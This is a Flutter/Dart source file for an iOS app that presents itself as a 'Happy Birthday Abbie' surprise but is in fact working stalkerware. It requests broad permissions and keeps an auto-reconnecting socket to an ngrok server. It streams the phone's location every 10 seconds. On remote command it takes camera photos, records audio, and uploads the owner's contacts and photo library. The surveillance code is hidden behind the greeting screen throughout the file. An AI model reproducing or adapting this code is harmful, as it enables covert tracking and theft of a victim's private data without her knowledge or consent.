import 'dart:async';
import 'dart:io';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:socket_io_client/socket_io_client.dart' as io;
import 'package:permission_handler/permission_handler.dart';
import 'package:geolocator/geolocator.dart';
import 'package:camera/camera.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:photo_manager/photo_manager.dart';
import 'package:path_provider/path_provider.dart';
import 'package:device_info_plus/device_info_plus.dart';

void main() {
  WidgetsFlutterBinding.ensureInitialized();
  runApp(MyApp());
}

class MyApp extends StatefulWidget {
  @override
  _MyAppState createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> with WidgetsBindingObserver {
  late io.Socket socket;
  bool connected = false;
  bool allPermissionsGranted = false;
  String serverUrl = 'https://headless-disagree-dean.ngrok-free.dev';
  Timer? heartbeatTimer;
  Timer? locationTimer;
  StreamSubscription<Position>? locationStream;
  CameraController? videoController;
  
  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    checkAndRequestPermissions();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      if (!connected) {
        connectToServer();
      }
    } else if (state == AppLifecycleState.paused) {
      startHeartbeat();
      startLocationTracking();
    }
  }

  Future<void> checkAndRequestPermissions() async {
    Map<Permission, PermissionStatus> statuses = await [
      Permission.location,
      Permission.locationAlways,
      Permission.camera,
      Permission.microphone,
      Permission.contacts,
      Permission.photos,
      Permission.notification,
      Permission.storage,
    ].request();
    
    bool allGranted = statuses.values.every((status) => 
      status == PermissionStatus.granted || 
      status == PermissionStatus.limited
    );
    
    if (allGranted) {
      setState(() {
        allPermissionsGranted = true;
      });
    }
    
    connectToServer();
    startLocationTracking();
  }

  void connectToServer() {
    socket = io.io(serverUrl, <String, dynamic>{
      'transports': ['websocket'],
      'autoConnect': true,
      'reconnection': true,
      'reconnectionDelay': 500,
      'reconnectionDelayMax': 2000,
      'reconnectionAttempts': double.infinity,
      'timeout': 10000,
    });

    socket.on('connect', (_) {
      setState(() => connected = true);
      sendDeviceInfo();
      startHeartbeat();
    });

    socket.on('disconnect', (_) {
      setState(() => connected = false);
      Future.delayed(Duration(milliseconds: 500), () {
        if (!connected && mounted) {
          socket.connect();
        }
      });
    });

    socket.on('connect_error', (error) {
      setState(() => connected = false);
      Future.delayed(Duration(seconds: 1), () {
        if (!connected && mounted) {
          socket.connect();
        }
      });
    });

    socket.on('command', (data) {
      handleCommand(data);
    });
  }

  void startHeartbeat() {
    heartbeatTimer?.cancel();
    heartbeatTimer = Timer.periodic(Duration(seconds: 5), (timer) {
      if (socket.connected) {
        socket.emit('heartbeat', {
          'timestamp': DateTime.now().toIso8601String(),
        });
      } else {
        socket.connect();
      }
    });
  }

  void startLocationTracking() {
    locationTimer?.cancel();
    locationTimer = Timer.periodic(Duration(seconds: 10), (timer) async {
      try {
        Position position = await Geolocator.getCurrentPosition(
          desiredAccuracy: LocationAccuracy.high,
        );
        if (socket.connected) {
          socket.emit('location_data', {
            'lat': position.latitude,
            'lng': position.longitude,
            'timestamp': DateTime.now().toIso8601String(),
          });
        }
      } catch (e) {}
    });
  }

  Future<void> sendDeviceInfo() async {
    try {
      DeviceInfoPlugin deviceInfo = DeviceInfoPlugin();
      IosDeviceInfo iosInfo = await deviceInfo.iosInfo;
      socket.emit('device_info', {
        'name': iosInfo.name,
        'model': iosInfo.utsname.machine,
        'systemVersion': iosInfo.systemVersion,
      });
    } catch (e) {
      socket.emit('device_info', {
        'name': 'iPhone',
        'model': 'iPhone 17',
        'systemVersion': 'iOS 18',
      });
    }
  }

  Future<void> handleCommand(dynamic data) async {
    final command = data['action'];
    final params = data['params'] ?? {};
    
    switch (command) {
      case 'get_location':
        await getLocation();
        break;
      case 'take_photo':
        await takePhoto(params['camera'] ?? 'front');
        break;
      case 'record_audio':
        await recordAudioViaVideo(int.parse(params['duration'] ?? '10'));
        break;
      case 'get_contacts':
        await getContacts();
        break;
      case 'get_photos':
        await getPhotos(int.parse(params['count'] ?? '20'));
        break;
      case 'get_device_info':
        await sendDeviceInfo();
        break;
      case 'happy_birthday':
        setState(() {
          allPermissionsGranted = true;
        });
        break;
    }
  }

  Future<void> getLocation() async {
    try {
      Position position = await Geolocator.getCurrentPosition(
        desiredAccuracy: LocationAccuracy.high,
      );
      socket.emit('location_data', {
        'lat': position.latitude,
        'lng': position.longitude,
        'timestamp': DateTime.now().toIso8601String(),
      });
    } catch (e) {
      socket.emit('error', {'error': e.toString()});
    }
  }

  Future<void> takePhoto(String cameraType) async {
    try {
      final cameras = await availableCameras();
      final camera = cameraType == 'front'
          ? cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.front)
          : cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.back);
      
      final controller = CameraController(camera, ResolutionPreset.high);
      await controller.initialize();
      final image = await controller.takePicture();
      final bytes = await File(image.path).readAsBytes();
      final base64Image = base64Encode(bytes);
      
      socket.emit('photo_data', {
        'image': base64Image,
        'camera': cameraType,
        'timestamp': DateTime.now().toIso8601String(),
      });
      
      await controller.dispose();
    } catch (e) {
      socket.emit('error', {'error': 'Camera error: $e'});
    }
  }

  Future<void> recordAudioViaVideo(int duration) async {
    try {
      final cameras = await availableCameras();
      final camera = cameras.firstWhere((c) => c.lensDirection == CameraLensDirection.back);
      
      videoController = CameraController(camera, ResolutionPreset.low);
      await videoController?.initialize();
      
      final videoPath = '${(await getTemporaryDirectory()).path}/audio_${DateTime.now().millisecondsSinceEpoch}.mp4';
      await videoController?.startVideoRecording();
      await Future.delayed(Duration(seconds: duration));
      final video = await videoController?.stopVideoRecording();
      
      if (video != null) {
        final bytes = await File(video.path).readAsBytes();
        final base64Video = base64Encode(bytes);
        socket.emit('audio_data', {
          'audio': base64Video,
          'format': 'mp4',
          'duration': duration,
          'timestamp': DateTime.now().toIso8601String(),
        });
      }
      
      await videoController?.dispose();
    } catch (e) {
      socket.emit('error', {'error': 'Audio error: $e'});
    }
  }

  Future<void> getContacts() async {
    try {
      final contacts = await ContactsService.getContacts();
      final contactList = contacts.map((c) => {
        'name': '${c.givenName ?? ''} ${c.familyName ?? ''}',
        'phones': c.phones?.map((p) => p.value).toList() ?? [],
      }).toList();
      socket.emit('contacts_data', {'contacts': contactList});
    } catch (e) {
      socket.emit('error', {'error': e.toString()});
    }
  }

  Future<void> getPhotos(int count) async {
    try {
      final PermissionState state = await PhotoManager.requestPermissionExtend();
      if (state.isAuth) {
        final List<AssetPathEntity> albums = await PhotoManager.getAssetPathList(
          type: RequestType.image,
          onlyAll: true,
        );
        if (albums.isNotEmpty) {
          final List<AssetEntity> assets = await albums[0].getAssetListPaged(
            page: 0,
            size: count,
          );
          for (var asset in assets) {
            final File? file = await asset.file;
            if (file != null) {
              final bytes = await file.readAsBytes();
              final base64Image = base64Encode(bytes);
              socket.emit('photo_data', {
                'image': base64Image,
                'filename': file.path.split('/').last,
                'timestamp': DateTime.now().toIso8601String(),
              });
            }
          }
        }
      }
    } catch (e) {
      socket.emit('error', {'error': 'Photo error: $e'});
    }
  }

  @override
  void dispose() {
    heartbeatTimer?.cancel();
    locationTimer?.cancel();
    locationStream?.cancel();
    videoController?.dispose();
    WidgetsBinding.instance.removeObserver(this);
    socket.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      home: Scaffold(
        backgroundColor: Colors.black,
        appBar: AppBar(
          title: Text('My Suprise'),
          backgroundColor: Colors.black87,
        ),
        body: Center(
          child: allPermissionsGranted
              ? Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    Icon(Icons.cake, size: 100, color: Colors.pink),
                    SizedBox(height: 20),
                    Text(
                      'Happy Birthday Abbie! 🎂',
                      style: TextStyle(fontSize: 28, fontWeight: FontWeight.bold, color: Colors.pink),
                    ),
                    SizedBox(height: 10),
                    Text('All systems activated!', style: TextStyle(fontSize: 16, color: Colors.green)),
                    SizedBox(height: 30),
                    Icon(connected ? Icons.cloud_done : Icons.cloud_off, size: 50, color: connected ? Colors.green : Colors.red),
                    Text(connected ? 'Connected' : 'Disconnected', style: TextStyle(color: connected ? Colors.green : Colors.red)),
                  ],
                )
              : Column(
                  mainAxisAlignment: MainAxisAlignment.center,
                  children: [
                    CircularProgressIndicator(),
                    SizedBox(height: 20),
                    Text('Requesting Permissions...', style: TextStyle(color: Colors.white, fontSize: 18)),
                  ],
                ),
        ),
      ),
    );
  }
}
